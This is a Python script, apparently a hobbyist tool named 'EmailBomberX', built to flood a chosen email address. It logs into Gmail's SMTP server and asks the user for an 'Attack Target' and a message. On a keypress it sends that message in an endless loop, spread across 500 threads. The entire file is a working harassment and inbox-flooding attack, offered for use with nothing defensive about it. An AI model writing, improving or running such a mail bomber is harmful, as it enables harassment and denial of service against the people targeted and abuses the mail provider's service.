import email
import os, time, requests
import threading
from pyexpat.errors import messages
from colorama import Fore
import smtplib
import keyboard
import threading


class EmailBomberX:
    def __init__(self):
        os.system("cls")
        self.target = ''
        self.count = 0
        self.targetmessage = ''
        self.port = 587
        self.myemails = 'YOUR-EMAIL'
        self.password = 'YOUR-PASSWORD'
        self.proxies = []
        os.system("mode 52, 20")
        design = f'''\u001b[38;5;47m  _____  \u001b[38;5;48m __ __       \u001b[38;5;49m_____     \u001b[38;5;50m______    \u001b[38;5;51m__   __   
\u001b[38;5;47m /\ __/\ \u001b[38;5;48m/_/\__/\    \u001b[38;5;49m/\___/\   \u001b[38;5;50m/ ____/\  \u001b[38;5;51m/\_\ /_/\  
\u001b[38;5;47m ) )__\/ \u001b[38;5;48m) ) ) ) )  \u001b[38;5;49m/ / _ \ \  \u001b[38;5;50m) ) __\/ \u001b[38;5;51m( ( (_) ) ) 
\u001b[38;5;47m/ / /   \u001b[38;5;48m/_/ /_/_/   \u001b[38;5;49m\ \(_)/ /   \u001b[38;5;50m\ \ \    \u001b[38;5;51m\ \___/ /  
\u001b[38;5;47m\ \ \_  \u001b[38;5;48m\ \ \ \ \   \u001b[38;5;49m/ / _ \ \   \u001b[38;5;50m_\ \ \   \u001b[38;5;51m/ / _ \ \  
\u001b[38;5;47m ) )__/\ \u001b[38;5;48m)_) ) \ \ \u001b[38;5;49m( (_( )_) ) \u001b[38;5;50m)____) ) \u001b[38;5;51m( (_( )_) ) 
\u001b[38;5;47m \/___\/ \u001b[38;5;48m\_\/ \_\/  \u001b[38;5;49m\/_/ \_\/  \u001b[38;5;50m\____\/   \u001b[38;5;51m\/_/ \_\/  
            
                \u001b[38;5;47mMade \u001b[38;5;49mby \u001b[38;5;50malbaner#\u001b[38;5;51m2938
        '''
        print(design)
        print()
        self.target = input(f'\u001b[38;5;47mAt\u001b[38;5;48mta\u001b[38;5;49mck\u001b[38;5;50m Tar\u001b[38;5;51mget {Fore.LIGHTCYAN_EX}>{Fore.LIGHTGREEN_EX} '.format(str(self.target)))
        self.targetmessage = input(f'\u001b[38;5;47mTar\u001b[38;5;48mget\u001b[38;5;49mMes\u001b[38;5;50msa\u001b[38;5;51mge {Fore.LIGHTCYAN_EX}>{Fore.LIGHTGREEN_EX} ')
        self.loginmail()

    
    def loginmail(self):
        global smtp
        try:
            smtp = smtplib.SMTP('smtp.gmail.com', self.port)
            smtp.ehlo()
            smtp.starttls()
            smtp.ehlo()
            smtp.login(self.myemails, self.password)
            print("")
            # print(f'\u001b[38;5;47mLo\u001b[38;5;48mgg\u001b[38;5;49med\u001b[38;5;50m As\u001b[38;5;51m {self.myemails}:{Fore.LIGHTGREEN_EX}{self.password}')
            self.sendingmails()

        except Exception as e:
            print(Fore.RED + str(e))
            print()
            print()
            print(Fore.BLUE + "Press Q to close the Program")
            while True:
                try:
                    if keyboard.is_pressed('q'):
                        exit(0)
                except:
                    break
    
    
    def sendingmails(self):
        print(f'\u001b[38;5;47mPre\u001b[38;5;48mss\u001b[38;5;49m F to\u001b[38;5;50m start\u001b[38;5;51m attack')
        print()
        while True:
            try:
                if keyboard.is_pressed('f'):
                    while 1:
                        smtp.sendmail(self.myemails, self.target, self.targetmessage)
                        self.count += 1
                        print(f'\u001b[38;5;47mAtt\u001b[38;5;48mack\u001b[38;5;49ming\u001b[38;5;50m Tar\u001b[38;5;51mget {Fore.LIGHTCYAN_EX}>{Fore.LIGHTGREEN_EX} {self.count}')
            except:
                break


for x in range(500):
    t = threading.Thread(target=EmailBomberX().sendingmails)
    t.start()


EmailBomberX().__init__()